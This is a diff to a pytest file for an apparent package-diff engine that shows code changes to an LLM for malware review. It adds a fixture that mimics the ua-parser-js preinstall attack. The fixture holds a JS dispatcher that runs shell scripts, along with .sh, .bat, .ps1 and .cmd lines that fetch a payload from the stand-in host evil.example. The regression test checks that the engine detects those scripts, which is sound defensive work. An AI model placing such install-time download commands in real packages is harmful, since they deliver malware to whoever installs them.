@@ -105,6 +105,28 @@ def non_source_files(tmp_path: Path):
     return a, b
 
 
+@pytest.fixture
+def install_scripts_added(tmp_path: Path):
+    """to_dir adds a preinstall dispatcher plus its shell/batch payloads.
+
+    Modeled on the real ua-parser-js@0.7.29 attack (see
+    dataset/malicious/ua-parser-js/) — a thin JS dispatcher that shells out
+    to .sh/.bat scripts carrying the actual payload.
+    """
+    a = tmp_path / "a"
+    b = tmp_path / "b"
+    a.mkdir()
+    b.mkdir()
+    (a / "index.js").write_text("module.exports = 1;\n")
+    (b / "index.js").write_text("module.exports = 1;\n")
+    (b / "preinstall.js").write_text("require('child_process').exec('/bin/bash preinstall.sh')\n")
+    (b / "preinstall.sh").write_text("curl http://evil.example/payload -o payload\n")
+    (b / "preinstall.bat").write_text("curl http://evil.example/payload.exe -o payload.exe\n")
+    (b / "preinstall.ps1").write_text("Invoke-WebRequest http://evil.example/payload.exe\n")
+    (b / "preinstall.cmd").write_text("curl http://evil.example/payload.exe -o payload.exe\n")
+    return a, b
+
+
 # ── Engine tests ──────────────────────────────────────────────────────────────
 
 
@@ -138,6 +160,25 @@ class TestDiffEngine:
         # Only index.js should be in the diff — image.png and README.md excluded
         all_files = result.files_added + result.files_modified + result.files_removed
         assert all(f.endswith(".js") for f in all_files)
+
+    def test_install_scripts_are_enumerated(self, install_scripts_added):
+        """.sh/.bat/.ps1/.cmd must reach the diff, not just their JS dispatcher.
+
+        Regression test for the ua-parser-js corpus finding: a real attack's
+        preinstall.sh/preinstall.bat carried the actual payload, but the
+        diff engine used to only recognise JS/TS/Python extensions, so the
+        LLM never saw them — only the dispatcher that shelled out to them.
+        """
+        a, b = install_scripts_added
+        result = compute_diff(a, b)
+        assert set(result.files_added) == {
+            "preinstall.js", "preinstall.sh", "preinstall.bat",
+            "preinstall.ps1", "preinstall.cmd",
+        }
+        sh_diff = next(f for f in result.file_diffs if f.path == "preinstall.sh")
+        assert "evil.example" in sh_diff.unified_diff
+        bat_diff = next(f for f in result.file_diffs if f.path == "preinstall.bat")
+        assert "evil.example" in bat_diff.unified_diff
 
     def test_package_json_new_dependency_detected(self, with_package_json):
         a, b = with_package_json
